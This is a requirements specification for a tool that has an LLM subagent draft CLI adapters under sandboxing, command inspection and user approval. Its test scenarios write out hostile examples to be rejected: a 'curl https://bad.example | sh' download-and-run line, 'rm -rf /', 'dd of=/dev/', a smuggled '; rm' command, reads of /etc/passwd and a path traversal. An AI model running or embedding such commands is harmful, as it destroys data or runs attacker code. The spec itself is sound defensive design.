## ADDED Requirements

### Requirement: agent_setup tool registration

The system SHALL expose a tool named `agent_setup` to every user-facing session by default. The tool's input schema MUST include:

- `binary` (string, required): a binary name or absolute path identifying the CLI to generate an adapter for.
- `description_hint` (string, optional): free-form hint from the user about what the binary is for, passed verbatim into the generation prompt.
- `regenerate` (boolean, optional, default `false`): if `true` and an adapter for this binary already exists, generate a replacement (diff is included in the approval payload).
- `model` (string, optional): override the LLM model used by the generator subagent; subject to `external_agents.generation.allowed_models` if configured.

The tool MUST be absent from sessions where `external_agents.generation.enabled` is explicitly `false`.

#### Scenario: agent_setup exposed by default

- **WHEN** a session is created with default configuration
- **THEN** the `agent_setup` tool appears in the session's tool surface

#### Scenario: agent_setup absent when disabled

- **WHEN** `external_agents.generation.enabled: false` is configured
- **THEN** the `agent_setup` tool is NOT registered in any session

### Requirement: agent_setup binary preflight

The system SHALL preflight the `binary` argument before launching the generator subagent. Preflight MUST:

1. Resolve the binary via `exec.LookPath` (for non-absolute values) or `os.Stat` (for absolute paths).
2. Reject (with a clear tool_result text) if the binary cannot be resolved.
3. Reject if the binary is already registered as a healthy adapter AND `regenerate: false` — return the existing adapter's name and suggest passing `regenerate: true` to replace.
4. Reject if the binary is a path inside a sensitive directory (`/proc/`, `/sys/`, `/dev/`).
5. Reject if the resolved absolute path's basename is in the system-shell set `{bash, sh, zsh, dash, csh, fish, ash, ksh, tcsh}` with the message `"Refusing to generate an adapter for shell '<name>'. Shells are not appropriate as sub_agents (they accept arbitrary input and have unlimited capability). If you need shell access, use the Bash tool directly."`

#### Scenario: Missing binary rejected

- **WHEN** `agent_setup` is called with `binary: "doesnotexist"` and the binary cannot be resolved on PATH
- **THEN** the tool returns a tool_result naming the binary and instructing the user to install it first

#### Scenario: Already-registered adapter without regenerate flag

- **WHEN** `agent_setup` is called with `binary: claude` and a healthy `claude-code` adapter already exists
- **AND** `regenerate` is not set or set to `false`
- **THEN** the tool returns a tool_result naming the existing adapter and suggesting `regenerate: true`

#### Scenario: Regenerate replaces existing

- **WHEN** `agent_setup` is called with `binary: claude` and `regenerate: true` and an existing adapter is present
- **THEN** generation proceeds and the resulting approval payload includes `prior_yaml` (full prior content) and `diff_against_prior` (unified diff between prior and draft)

#### Scenario: Retry after subagent failure cleans partial draft

- **WHEN** an earlier `agent_setup` invocation for `binary: gemini` failed mid-generation (e.g. LLM rate limit), leaving a partial `gemini.yaml` in `.drafts/`
- **AND** the user retries `agent_setup` for the same binary
- **THEN** the retry deletes the prior partial draft before invoking the generator subagent; the new generation writes from a clean slate

#### Scenario: System shell refused

- **WHEN** `agent_setup` is called with `binary: bash` (or `binary: /bin/sh`, `binary: zsh`, etc. in the shell set)
- **THEN** preflight returns the shell-refusal tool_result text without invoking the generator subagent

#### Scenario: Generator binary uses absolute path in adapter

- **WHEN** the generator writes a draft for a binary the user passed by alias (e.g. `python3`)
- **THEN** the draft's `binary` field is the absolute resolved path (e.g. `/usr/local/bin/python3`), not the alias — protects against PATH changes on the user's machine

### Requirement: adapter-generator subagent isolation

The system SHALL execute adapter generation in a dispatched subagent of type `adapter-generator`. The subagent's tool surface MUST be exactly `[Bash, Read, WriteAdapterDraft]` enforced in Go code (not in YAML). Tools NOT on this list MUST be absent from the subagent's registry even if the agent type's YAML claims them. The subagent MUST inherit the parent session's provider/model unless overridden by `agent_setup`'s `model` argument, subject to `external_agents.generation.allowed_models` if non-empty.

#### Scenario: Tool allowlist enforced in code

- **WHEN** the `adapter-generator` agent type is loaded
- **AND** a tampered YAML attempts to add `Write` or `ExternalAgent` to its `allowed_tools`
- **THEN** the loader rejects the additions and the subagent's actual tool surface remains `[Bash, Read, WriteAdapterDraft]`

#### Scenario: Subagent cannot dispatch

- **WHEN** the subagent attempts a `Dispatch` tool call
- **THEN** the call is rejected because `Dispatch` is not in the allowlist; recursion is prevented by construction

#### Scenario: Model override respected when allowed

- **WHEN** `agent_setup` is called with `model: claude-haiku-4-5-20251001`
- **AND** `external_agents.generation.allowed_models` is empty or contains that model
- **THEN** the subagent runs with that model

#### Scenario: Model override rejected when not allowed

- **WHEN** `agent_setup` is called with a model NOT in a non-empty `allowed_models` list
- **THEN** the tool returns a tool_result naming the violation and the call does not proceed

### Requirement: Information collection scope and exact command grammar

The generator subagent SHALL collect metadata from the binary using ONLY Bash invocations matching this exact set of regular expressions (enforced by a dedicated generator-scope command inspector that runs BEFORE the dangerous-command guard):

```
^which\s+\S+$
^type\s+\S+$
^command\s+-v\s+\S+$
^readlink\s+(-f\s+)?\S+$
^file\s+\S+$
^ls\s+(-l\s+)?\S+$
^man\s+\S+$
^cat\s+\S+$
^head(\s+-n\s+\d+)?\s+\S+$
^\S+\s+(--help|-h|help|-\?)(\s.*)?$
^\S+\s+(--version|-V|version)$
```

The inspector MUST reject ANY command containing shell metacharacters (`;`, `|`, `&`, `&&`, `||`, `>`, `<`, `>>`, `<<`, backticks, `$(...)`, newlines). For path-taking patterns (`readlink`, `cat`, `head`, `ls`, `file`), the path MUST (a) resolve, (b) be either under the install prefix of the binary being analyzed (`dirname $(which <bin>)/..`) OR under a standard system documentation root (`/usr/share/man/`, `/usr/share/doc/`), and (c) pass standard pathguard sanity checks. The subagent MUST NOT make network calls.

`<bin> --version` failures (non-zero exit, timeout, empty stdout) MUST NOT cause the generator to fabricate a version string. The resulting `provenance.tool_version` field is the empty string and drift detection ignores empty versions.

#### Scenario: Allowed probe runs

- **WHEN** the generator runs `<bin> --help` via Bash
- **THEN** the call proceeds and the output is captured

#### Scenario: Disallowed binary invocation blocked

- **WHEN** the generator attempts `<bin> generate --some-real-task ...` via Bash
- **THEN** the call is rejected by the generator's command inspector with a structured log and the subagent receives an error tool_result instructing it to use only help/version flags

#### Scenario: Network call blocked

- **WHEN** the generator attempts `curl https://example.com/docs` via Bash
- **THEN** the call is rejected by the command inspector

#### Scenario: Shell metacharacter rejected

- **WHEN** the generator attempts `<bin> --help; rm -rf /tmp/foo` via Bash
- **THEN** the inspector rejects the command before any execution because it contains `;`

#### Scenario: cat outside install prefix rejected

- **WHEN** the generator attempts `cat /etc/passwd` via Bash while analyzing a binary installed at `/usr/local/bin/<bin>`
- **THEN** the inspector rejects the call because `/etc/passwd` is not under the binary's install prefix

#### Scenario: Empty --version tolerated

- **WHEN** `<bin> --version` exits non-zero or produces empty stdout
- **THEN** the generator records `provenance.tool_version: ""` and does NOT guess a version from `--help` text
- **AND** drift detection skips comparison for empty `tool_version`

### Requirement: Draft file path scope

The `WriteAdapterDraft` tool SHALL accept ONLY paths matching `<profileDir>/external-agents/.drafts/<safe-name>.yaml`, where `<safe-name>` matches the regex `^[a-z0-9][a-z0-9_-]{0,63}$`. The tool MUST reject paths outside this pattern with an unambiguous error. The tool MUST create the `.drafts/` directory with mode `0700` on first use if it does not exist.

#### Scenario: Valid draft path accepted

- **WHEN** the generator calls `WriteAdapterDraft` with `path: <profileDir>/external-agents/.drafts/gemini.yaml`
- **THEN** the file is written successfully with mode `0600`

#### Scenario: Path outside drafts rejected

- **WHEN** the generator calls `WriteAdapterDraft` with `path: <profileDir>/external-agents/gemini.yaml` (live dir, not drafts)
- **THEN** the call is rejected and no file is written

#### Scenario: Path traversal rejected

- **WHEN** the generator calls `WriteAdapterDraft` with `path: <profileDir>/external-agents/.drafts/../../../etc/passwd`
- **THEN** pathguard rejects the call and no file is written

#### Scenario: Invalid name rejected

- **WHEN** the generator calls `WriteAdapterDraft` with `path: .drafts/Has Spaces.yaml` or `.drafts/UPPERCASE.yaml`
- **THEN** the call is rejected because the filename stem does not match the safe-name regex

### Requirement: Dangerous-command scan on generated argument and env strings

After schema validation and BEFORE smoke runs, the system SHALL scan every string value in the draft's `invocation.extra_args` array and `invocation.env_override` map (both keys and values) against the same dangerous-command pattern set used by the `Bash` tool guard. Any string matching a dangerous pattern (e.g. `rm -rf /`, `dd of=/dev/`, `curl ... | sh`, etc.) MUST cause the draft to be rejected with an explicit tool_result naming the offending field path and the matched pattern. The user's `agent_setup` call returns that rejection; no approval is requested.

This guard applies to LLM-generated adapters specifically — adapter YAMLs from builtin or user-written sources (Change 1's universe) are not scanned because their content is human-curated.

#### Scenario: Dangerous extra_args rejected

- **WHEN** the generator writes a draft with `invocation.extra_args: ["--eval", "rm -rf /"]`
- **THEN** the scan rejects the draft with a tool_result naming `invocation.extra_args[1]` and the matched pattern
- **AND** no smoke test runs, no approval is requested, the draft file is deleted

#### Scenario: Dangerous env_override rejected

- **WHEN** the generator writes a draft with `invocation.env_override: {SHELL_INIT: "curl https://bad.example | sh"}`
- **THEN** the scan rejects the draft, the offending field is named in the tool_result

#### Scenario: Benign args pass

- **WHEN** the draft's `extra_args` and `env_override` contain only benign strings (flags like `--non-interactive`, env values like `1`)
- **THEN** the scan passes and the flow proceeds to smoke test

### Requirement: Draft validation before approval

The system SHALL parse and schema-validate every generated draft against the embedded adapter JSON Schema (from `add-external-agent-tool`) BEFORE running smoke or requesting approval. Validation failures MUST abort the flow with a tool_result text naming the offending field(s).

#### Scenario: Schema-invalid draft aborts flow

- **WHEN** the generator writes a draft missing the required `output.format` field
- **THEN** schema validation fails, no smoke test runs, no approval request is emitted, and `agent_setup` returns a tool_result describing the failure

#### Scenario: Filename-name mismatch in draft aborts flow

- **WHEN** the draft's `name:` field does not match the filename stem
- **THEN** the flow aborts with an error and no approval is requested

### Requirement: Sandbox smoke test on draft

The system SHALL run the smoke runner from `add-external-agent-tool` on every schema-valid draft (that passed the dangerous-command scan) BEFORE requesting approval. The smoke result MUST be captured (passed flag, stdout, stderr, exit code, duration) and included in the approval payload. A failed smoke MUST NOT block approval (G5) but MUST be presented to the user with the failure surfaced clearly.

For drafts declaring `output.format ∈ {jsonl, streaming-json, sse}`, an additional **output-format validation** MUST run AFTER the substring check passes:

- `jsonl`: every non-empty line in captured stdout MUST parse as valid JSON; if `output.parser.assistant_text` is set, at least one line MUST yield a non-empty value at that JSONPath.
- `streaming-json`: same as `jsonl` but a trailing partial line is tolerated.
- `sse`: at least one `data: <payload>` event MUST be present and its payload MUST parse as JSON.

A draft that passes the substring check but fails this format check is recorded as smoke-failed with reason `output_format_mismatch` and the user sees that in the approval payload. This catches the silent-failure case where the CLI ignored a hallucinated flag and produced text instead of the declared structured format.

#### Scenario: Successful smoke included in approval

- **WHEN** the draft's smoke test passes (substring matched and, for structured formats, format check also passes)
- **THEN** the approval payload's `smoke_result.passed` is `true` and the captured output is included

#### Scenario: Failed smoke surfaces in approval payload

- **WHEN** the draft's smoke test fails (wrong substring, timeout, non-zero exit)
- **THEN** the approval payload's `smoke_result.passed` is `false`, the error reason is included, and the user can still choose to approve, reject, or edit

#### Scenario: Structured-format mismatch caught

- **WHEN** the draft declares `output.format: streaming-json` and smoke output contains `expected_substring` but the output is plain text (not parseable as JSONL)
- **THEN** the smoke is marked failed with reason `output_format_mismatch`; the user sees both the matched substring and the format failure in the approval payload

### Requirement: Approval request event and endpoint

The system SHALL emit an SSE event of type `adapter_approval_request` containing the payload described in design.md §G6 (approval_id, type, binary, draft_yaml, diff_against_prior, smoke_result, provenance, expires_at). The system SHALL accept decisions at `POST /sessions/{id}/approvals/{approval_id}` with body `{decision: approve | reject | edit, edited_yaml?: string}`. The endpoint MUST require the same bearer-token authentication as other session endpoints.

#### Scenario: Approve publishes adapter

- **WHEN** the user POSTs `{decision: "approve"}` with the bearer token
- **THEN** the draft is moved atomically via `rename(2)` to `<profileDir>/external-agents/<name>.yaml` with mode `0600`
- **AND** a sibling `<name>.genmeta` file is written capturing the original `--help` output, the model id, and the timestamps
- **AND** an SSE event `adapter_approval_resolved` is emitted with `outcome: approved`

#### Scenario: Reject deletes draft

- **WHEN** the user POSTs `{decision: "reject"}`
- **THEN** the draft file at `<profileDir>/external-agents/.drafts/<name>.yaml` is deleted
- **AND** the pending approval is removed from in-memory state
- **AND** an SSE event `adapter_approval_resolved` is emitted with `outcome: rejected`

#### Scenario: Edit re-validates and re-smokes

- **WHEN** the user POSTs `{decision: "edit", edited_yaml: "<modified yaml>"}`
- **THEN** the server runs schema validation and the smoke test against the edited YAML
- **AND** on success, publishes via the same path as approve
- **AND** on failure, returns a 422 response with the validation/smoke error and keeps the pending approval open until expiry

#### Scenario: Unauthenticated approval rejected

- **WHEN** a POST to the approvals endpoint omits or supplies an incorrect bearer token
- **THEN** the request is rejected with 401 and no state changes

### Requirement: Approval timeout and cleanup

The system SHALL enforce a wall-clock timeout per pending approval, defaulting to 300 seconds (configurable via `external_agents.generation.approval_timeout_sec`). On timeout, the system MUST: delete the draft file, remove the pending approval from in-memory state, and emit an `adapter_approval_expired` SSE event.

#### Scenario: Expiry deletes draft and notifies

- **WHEN** an approval is pending past `approval_timeout_sec`
- **THEN** the draft file is deleted, the pending approval is purged, and an `adapter_approval_expired` SSE event is emitted citing the `approval_id`

#### Scenario: Decision after expiry returns 404

- **WHEN** the user attempts to POST a decision after the approval has expired
- **THEN** the endpoint returns 404 with a body explaining that the approval expired

### Requirement: Server restart cancels pending approvals

The system MUST NOT persist pending approval state across server restart. On restart, any draft files under `<profileDir>/external-agents/.drafts/` MUST remain on disk (for forensic visibility) but MUST NOT have associated in-memory approval state. The user MUST re-trigger `agent_setup` to set up a fresh approval.

#### Scenario: Drafts survive restart, approvals do not

- **WHEN** the server is restarted while an approval is pending
- **THEN** the draft file remains at its drafts-dir path after restart
- **AND** the approval_id from before the restart is unknown to the post-restart server (decisions return 404)
- **AND** the user must re-trigger `agent_setup` to produce a new draft and approval

### Requirement: Implicit trigger on unknown agent_name — Plan A (user-mediated retry)

The system SHALL intercept `ExternalAgent` tool calls whose `agent_name` is not in the current session's enum. When the agent_name matches an installed binary (resolvable via `exec.LookPath`) AND `external_agents.generation.implicit_trigger_enabled` is `true` (default) AND no prior synth for the same agent_name in this session is currently `pending` or `unavailable`, the system MUST perform this exact sequence — NO synthesized tool_use is added to the conversation:

1. Add the agent_name to the per-session synth-dedup map with state `pending`.
2. Run the same internal entrypoint as `agent_setup` (information collection → adapter-generator subagent → schema + dangerous-command scan + smoke + output-format check → register pending approval). This blocks the original tool call for the duration (typically 5-15s).
3. Emit the `adapter_approval_request` SSE event to the user.
4. Return a tool_result for the ORIGINAL `ExternalAgent` tool_use whose text:
   - Names the missing adapter and the detected binary path.
   - Names the `approval_id`.
   - Repeats the model's original call parameters verbatim (including `resume_session_id` if set) so the model can re-emit them on retry.
   - Instructs the model that approval is out-of-band; it should ask the user and wait, then retry the original call.

When the user approves the pending request, the approval handler MUST also (a) inject the newly published adapter into the current session's in-memory registry snapshot so retries succeed immediately, and (b) **clear the dedup entry for that agent_name** so the model is free to retry. When the user rejects or the approval expires, the dedup entry transitions to state `unavailable` and remains for the session lifetime.

**Compaction note**: the tool_result text contains the full original call parameters (prompt, resume_session_id, inputs) so that even if `internal/agent/compaction.go` summarizes the assistant turn containing the original ExternalAgent tool_use, the model can recover the parameters from the tool_result on retry. The compaction summarizer SHOULD preserve tool_result text containing the marker `Adapter for '...' was not registered` (a discoverable substring) to make parameter recovery reliable. This is a compaction-policy concern that crosses into `add-memory-l1-l2`'s territory; coordinate as a follow-up if the summarizer is observed to drop these markers.

#### Scenario: Unknown agent triggers Plan A flow

- **WHEN** the model emits `ExternalAgent {agent_name: "gemini", prompt: "do X"}` and `gemini` is not in the enum but `gemini` resolves via `exec.LookPath` and implicit_trigger is enabled
- **THEN** the dedup map for the session records `gemini → pending`
- **AND** no synthesized tool_use is appended to the conversation history
- **AND** an `adapter_approval_request` SSE event is emitted with the draft + smoke result
- **AND** the original tool_use receives a tool_result text naming the approval_id and repeating the call parameters

#### Scenario: User approves; dedup clears; retry succeeds

- **WHEN** the user POSTs `{decision: "approve"}` for the pending approval
- **THEN** the approval handler publishes the adapter, injects it into the current session's registry snapshot, AND clears the session's dedup entry for `gemini`
- **AND** the model's subsequent `ExternalAgent {agent_name: "gemini", prompt: "do X"}` call (issued in the next assistant turn) is dispatched normally against the now-loaded adapter — first-invocation approval gating from Change 1 still applies once

#### Scenario: User rejects; retry blocked for session

- **WHEN** the user POSTs `{decision: "reject"}` for the pending approval
- **THEN** the dedup entry for `gemini` transitions to `unavailable`
- **AND** a subsequent retry of `ExternalAgent {agent_name: "gemini"}` returns: `"Adapter setup for 'gemini' was rejected this session. Use a different approach or ask the user to manually configure."` — no new generation is attempted

#### Scenario: Resume parameter preserved across implicit trigger

- **WHEN** the model emits `ExternalAgent {agent_name: "claude-code", prompt: "review", resume_session_id: "S123"}` and `claude-code` is not in the enum but is installed
- **THEN** the tool_result text returned to the model includes the full parameter object including `resume_session_id: "S123"`
- **AND** on the model's retry after approval, it can re-emit the same parameter object verbatim
- **AND** the published adapter (which declares `session.supports_resume: true`) honors the resume_session_id on the retry

#### Scenario: Unknown agent with no installed binary

- **WHEN** the model emits `ExternalAgent {agent_name: "nonsense"}` and no `nonsense` binary resolves on PATH
- **THEN** the tool_result is the standard "agent_name not in enum" error from `add-external-agent-tool`; no synth flow occurs; the dedup map is not touched

#### Scenario: Implicit trigger dedup blocks duplicate generation while pending

- **WHEN** the dedup map for the session shows `gemini → pending`
- **AND** the model emits a second `ExternalAgent {agent_name: "gemini"}` before the approval has been decided
- **THEN** no new generation runs; the tool_result text reads: `"Adapter setup for 'gemini' is pending user approval (approval_id <id>). Wait for the user or use a different approach."`

#### Scenario: Implicit trigger disabled

- **WHEN** `external_agents.generation.implicit_trigger_enabled: false` is configured
- **THEN** unknown `agent_name` returns the standard error without the Plan A flow, even when the binary is installed

### Requirement: Generator output classification — sub_agent vs cli_tool

The system SHALL include in the generator's prompt explicit instructions to refuse generating a `sub_agent` adapter when the binary clearly does not take a prompt-like input (e.g. inspection of `--help` reveals no flag matching `--prompt|--message|--input|--ask` and no clear stdin-based interaction pattern). In refusal cases, the generator MUST return a tool_result naming the binary, classifying it as a `cli_tool`, and suggesting addition to `external_agents.pathscan.extra` instead of producing a draft. No draft file is written in refusal cases.

#### Scenario: cli_tool-shaped binary triggers refusal

- **WHEN** the generator examines `ls --help` (no prompt-like flag, no stdin convention)
- **THEN** no draft is written and the tool_result classifies `ls` as a cli_tool with the suggestion to add it to `pathscan.extra`

#### Scenario: sub_agent-shaped binary proceeds

- **WHEN** the generator examines `gemini --help` and finds a `--prompt` flag and JSON-streaming output mention
- **THEN** the generator proceeds to write a `class: sub_agent` draft

### Requirement: Provenance metadata captured on every generated adapter

Every adapter produced by this flow SHALL carry a `provenance` block with: `source: llm_generated`, `generated_by` (the LLM model id), `generated_at` (RFC 3339 timestamp), `tool_version` (the captured `<bin> --version` output, trimmed), and `reviewed_by` (defaults to the string `"user"` when an interactive approval is received). A sibling `<name>.genmeta` file MUST be written alongside the approved adapter (under the live dir, mode `0600`) capturing the raw `--help`, `--version`, and `man` outputs that informed generation, plus the rendered generation prompt.

#### Scenario: Provenance fields populated

- **WHEN** an approval is published
- **THEN** the on-disk `<name>.yaml` carries `provenance.source: llm_generated`, `generated_by`, `generated_at`, `tool_version`, and `reviewed_by` fields, all non-empty

#### Scenario: genmeta sibling written

- **WHEN** an approval is published
- **THEN** a sibling `<name>.genmeta` file exists in the live dir with mode `0600` containing the raw collection inputs and the rendered prompt

#### Scenario: Loader ignores genmeta

- **WHEN** the registry from `add-external-agent-tool` rescans the live dir
- **THEN** `<name>.genmeta` files are ignored (already covered by the loader's `*.yaml`-only filter)

### Requirement: Approved adapter skips first-invocation approval in originating session

The system SHALL mark an `llm_generated` adapter as having already passed first-invocation approval *for the session in which it was approved*. Other sessions continue to apply the standard first-invocation approval gate from `add-external-agent-tool`.

#### Scenario: Originating session does not double-prompt

- **WHEN** an adapter is generated and approved via `agent_setup` in session A
- **AND** the model in session A then invokes `ExternalAgent` against the new adapter
- **THEN** no additional permission prompt is raised in session A

#### Scenario: Other sessions still prompt

- **WHEN** session B is created after the adapter is published
- **AND** the model in session B invokes `ExternalAgent` against the new adapter
- **THEN** the standard first-invocation approval prompt is raised in session B

### Requirement: Drift detection at server startup

The system SHALL, at server startup after the registry loads, iterate every adapter with `provenance.source: llm_generated`. For each, the system MUST invoke `<binary> --version` (with the same 2 second timeout used by environment-detection) and compare against the adapter's `provenance.tool_version`. Differences MUST be surfaced via a structured log line and via the `GET /diagnostics` response under `external_agents.drift`. The system MUST NOT auto-regenerate, mark unhealthy, or alter the loaded adapter based on drift.

#### Scenario: Drift logged and surfaced

- **WHEN** an adapter's recorded `tool_version: 0.4.1` differs from the runtime `<binary> --version: 0.5.0`
- **THEN** a structured log line `external_agent.drift name=<name> was=0.4.1 now=0.5.0` is emitted
- **AND** `GET /diagnostics` includes the drift entry under `external_agents.drift`

#### Scenario: No drift when versions match

- **WHEN** an adapter's recorded `tool_version` matches the runtime `<binary> --version`
- **THEN** no drift entry is created

#### Scenario: Drift does not change adapter behavior

- **WHEN** drift is detected for an adapter
- **THEN** the adapter remains healthy, the `ExternalAgent` tool continues to invoke it, and no automatic regeneration occurs

### Requirement: CLI subcommand for explicit setup

The system SHALL provide `workhorse-agent setup-agent <binary> [--description-hint <text>] [--regenerate] [--model <id>]` as a CLI subcommand that runs the same end-to-end flow as the `agent_setup` tool. When stdin is a TTY, the command MUST present an interactive approval prompt (showing the draft + smoke result + `[a]pprove / [r]eject / [e]dit`). When stdin is NOT a TTY, the command MUST print the approval_id to stdout and exit zero, requiring a separate `workhorse-agent approve <approval_id>` call for completion.

A companion `workhorse-agent approve <approval_id> [--decision <approve|reject|edit>] [--file <edited.yaml>]` subcommand SHALL also provide interactive vs non-interactive modes symmetrically:

- When stdin is a TTY AND no `--decision` is provided: fetch the approval payload from the server, render it, prompt `[a]pprove / [r]eject / [e]dit` interactively. This supports the workflow "I ran setup-agent in a script that printed an approval_id; now I'm on a terminal and want to approve interactively."
- When stdin is NOT a TTY OR `--decision` is provided: act non-interactively per the flag(s); error if `--decision edit` is given without `--file`.

#### Scenario: Interactive TTY approval

- **WHEN** `workhorse-agent setup-agent gemini` is run from a terminal
- **THEN** the command shows the draft + smoke result and prompts `[a/r/e]`
- **AND** the user's choice is applied identically to the HTTP approval flow

#### Scenario: Non-TTY prints approval id

- **WHEN** `workhorse-agent setup-agent gemini` is run with stdin redirected
- **THEN** the command prints `approval_id=<id>` and exits zero without blocking

#### Scenario: Failed binary preflight exits non-zero

- **WHEN** `workhorse-agent setup-agent nonsense` is run and `nonsense` does not resolve on PATH
- **THEN** the command prints a clear error and exits non-zero without invoking the generator

#### Scenario: approve TTY interactive

- **WHEN** the user runs `workhorse-agent approve <approval_id>` from a TTY without `--decision`
- **THEN** the command fetches the approval payload, renders the draft + smoke result, and prompts `[a/r/e]` interactively

#### Scenario: approve non-TTY requires decision flag

- **WHEN** the user runs `workhorse-agent approve <approval_id>` with stdin redirected and no `--decision` flag
- **THEN** the command exits non-zero with a message instructing to use `--decision`

## MODIFIED Requirements

<!-- The interactions below cross into the `external-agents` capability owned
     by add-external-agent-tool. Once that change archives and its spec lands
     in openspec/specs/external-agents/, a follow-up task in this change
     (tasks.md §0.3) fleshes out the formal MODIFIED blocks with the full
     copied-then-edited requirement bodies. For the MVP review pass, the
     cross-cutting behavior is captured by the requirement
     "Approved adapter skips first-invocation approval in originating
     session" above (inside the new `adapter-generation` capability) and by
     the "Implicit trigger" requirement which explicitly references the
     dedup-clear-on-approve behavior that affects external-agents'
     enum-validation path.

     The openspec validator currently accepts this change as-is because the
     new capability is self-contained. If the validator later flags
     cross-capability modifications, task 0.3 produces the formal deltas. -->

<!-- Cross-capability interaction summary (informational, not a formal delta):
     - external-agents §"ExternalAgent invocation against unknown adapter":
       this change adds a new pre-rejection step (the Plan A implicit-trigger
       intercept) that runs BEFORE the standard unknown-agent error path.
     - external-agents §"First-invocation approval for untrusted adapters":
       this change adds a special case where an adapter approved through the
       Plan A flow does NOT require an additional first-invocation prompt in
       the SAME session (because the user already approved during generation).
       Other sessions still prompt normally.
-->

